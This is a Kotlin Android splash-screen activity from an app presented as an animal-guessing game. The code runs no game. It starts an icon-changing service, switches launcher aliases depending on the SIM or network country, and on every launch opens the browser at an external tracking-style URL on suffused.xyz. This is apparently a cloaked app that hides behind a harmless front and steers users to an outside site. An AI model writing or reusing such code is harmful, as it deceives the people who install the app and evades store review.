package com.guesstheanimal.zoo.game

import android.annotation.SuppressLint
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.telephony.TelephonyManager
import android.util.Log
import android.view.View
import android.widget.ProgressBar
import android.widget.TextView
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat.getSystemService
import java.util.*

class SplashScreen : AppCompatActivity() {

    @RequiresApi(Build.VERSION_CODES.N)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash_screen)

        startService(Intent(this, ChangeAppIconService::class.java))
        if (Country(this)!!.contains("az") || Country(this)!!.contains("am") || Country(this)!!.contains("by")
            || Country(this)!!.contains("kz") || Country(this)!!.contains("kg") || Country(this)!!.contains("md")
            || Country(this)!!.contains("ru") || Country(this)!!.contains("tj") || Country(this)!!.contains("uz")
            || Country(this)!!.contains("ua")) {

        }else{
            setAliasEnabled(".one")
        }
    }

    private val aliases = arrayOf(".one", ".two")

    private fun setAliasEnabled(aliasName: String) {
        aliases.forEach {
            val action = if (it == aliasName)
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            else
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED

            packageManager.setComponentEnabledSetting(
                ComponentName(
                    this,
                    "${BuildConfig.APPLICATION_ID}$aliasName"
                ),
                action,
                PackageManager.DONT_KILL_APP
            )
        }
    }

    fun Country(context: Context): String? {
        try {
            val tm: TelephonyManager = context.getSystemService(TELEPHONY_SERVICE) as TelephonyManager
            val simCountry = tm.getSimCountryIso()
            if (simCountry != null && simCountry.length == 2) { // SIM country code is available
                return simCountry.toLowerCase(Locale.US);
            }
            else if (tm.getPhoneType() != TelephonyManager.PHONE_TYPE_CDMA) { // device is not 3G (would be unreliable)
                val networkCountry = tm.getNetworkCountryIso();
                if (networkCountry != null && networkCountry.length == 2) { // network country code is available
                    return networkCountry.toLowerCase(Locale.US);
                }
            }
        }
        catch (e:Exception) {

        }
        return null;
    }

    override fun onResume() {
        super.onResume()
        Handler(Looper.myLooper()!!).postDelayed(
            {
                isOnline(this)
            }, 1000)

    }

    @SuppressLint("NewApi", "MissingPermission")
    fun isOnline(context: Context): Boolean {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (connectivityManager != null) {
            val capabilities =
                connectivityManager.getNetworkCapabilities(connectivityManager.activeNetwork)
            if (capabilities != null) {
                if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
                    val uriUrl: Uri = Uri.parse("https://suffused.xyz/s8xph8Hn?id=com.guesstheanimal.zoo.game ")
                    val launchBrowser = Intent(Intent.ACTION_VIEW, uriUrl)
                    startActivity(launchBrowser)
                    Log.d("Internet", "NetworkCapabilities.TRANSPORT_CELLULAR")
                    return true
                }else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
                    val uriUrl: Uri = Uri.parse("https://suffused.xyz/s8xph8Hn?id=com.guesstheanimal.zoo.game ")
                    val launchBrowser = Intent(Intent.ACTION_VIEW, uriUrl)
                    startActivity(launchBrowser)
                    Log.d("Internet", "NetworkCapabilities.TRANSPORT_WIFI")
                    return true
                }else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)) {
                    val uriUrl: Uri = Uri.parse("https://suffused.xyz/s8xph8Hn?id=com.guesstheanimal.zoo.game ")
                    val launchBrowser = Intent(Intent.ACTION_VIEW, uriUrl)
                    startActivity(launchBrowser)
                    Log.d("Internet", "NetworkCapabilities.TRANSPORT_ETHERNET")
                    return true
                }else{
                    val uriUrl: Uri = Uri.parse("https://suffused.xyz/s8xph8Hn?id=com.guesstheanimal.zoo.game")
                    val launchBrowser = Intent(Intent.ACTION_VIEW, uriUrl)
                    startActivity(launchBrowser)
                    Log.d("Internet", "else Internet")
                }
            }else{
//                startActivity(Intent(this,StartActivity::class.java))
//                finish()
                val text = findViewById<TextView>(R.id.textView9)
                text.text = "No Connection"
                val progressBar = findViewById<ProgressBar>(R.id.progressBar)
                progressBar.visibility = View.GONE
                Log.d("Internet", "Error Internet")
            }
        }else{
//            startActivity(Intent(this,StartActivity::class.java))
//            finish()
            val text = findViewById<TextView>(R.id.textView9)
            text.text = "No Connection"
            val progressBar = findViewById<ProgressBar>(R.id.progressBar)
            progressBar.visibility = View.GONE
            Log.d("Internet", "Error Internet")
        }
        return false
    }
}